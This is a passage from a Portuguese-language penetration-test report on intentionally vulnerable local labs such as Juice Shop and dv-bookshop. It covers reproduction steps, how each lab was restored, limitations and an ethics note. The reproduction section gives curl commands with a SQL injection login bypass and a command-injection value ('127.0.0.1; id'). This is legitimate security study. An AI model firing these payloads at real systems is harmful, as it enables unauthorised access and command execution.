├── ws-sqli.json              # dump de senhas (WS-01)
└── js-stacktrace.txt         # paths internos do Juice Shop (JS-03)
```

Relatórios de ferramentas: `reports/raw/{spectral.txt,zap-baseline.json,restler-fuzzlean.txt}`
e `reports/*.md`.

### 9.2 Reprodutibilidade

```bash
# subir os labs
cd labs
(cd dv-bookshop && ../.venv/bin/python app.py &)      # 5005
(cd vulnshop   && ../.venv/bin/python app.py &)       # 5000
(cd websec-sqli && PORT=5003 node src/server.js &)    # 5003
# Juice Shop já em execução no container (3000)

# cadeia principal do dv-bookshop
curl -c /tmp/a.jar -X POST http://127.0.0.1:5005/login \
     --data-urlencode "username=admin' OR 1=1 /*!50000" --data-urlencode "password=x"
curl -b /tmp/a.jar -X POST http://127.0.0.1:5005/admin/ping \
     --data-urlencode "host=127.0.0.1; id"
```

### 9.3 Estado dos labs após o teste

- `dv-bookshop`: `users.db` restaurado (senha original do admin válida), `bookshop.db`
  reinicializado (0 pedidos), configurações de `lab_config.json` no padrão.
- `vulnshop`: e-mail da usuária `alice` restaurado para `alice@email.com`.
- `websec-sqli`: banco em memória (reinicia a cada start).
- `Juice Shop`: nenhum dado persistente alterado (apenas leitura e login).

### 9.4 Limitações

- Não foi tentado brute force real de senhas, exploração do console Werkzeug (PIN) nem
  desserialização; os impactos foram demostrados pelo caminho mais curto.
- Os CVSS são estimativas para priorização, não cálculo formal.
- Não houve teste de infraestrutura (rede, TLS, containers) além do exposto pelas aplicações.

---

## 10. Nota ética e legal

Todas as atividades foram realizadas em aplicações **intencionalmente vulneráveis**, executadas
localmente e de propriedade do autor, com o objetivo de estudo e validação de ferramentas. Nenhum
dado de terceiros foi acessado. As técnicas aqui descritas não devem ser usadas contra sistemas
sem autorização escrita e dentro de escopo definido.
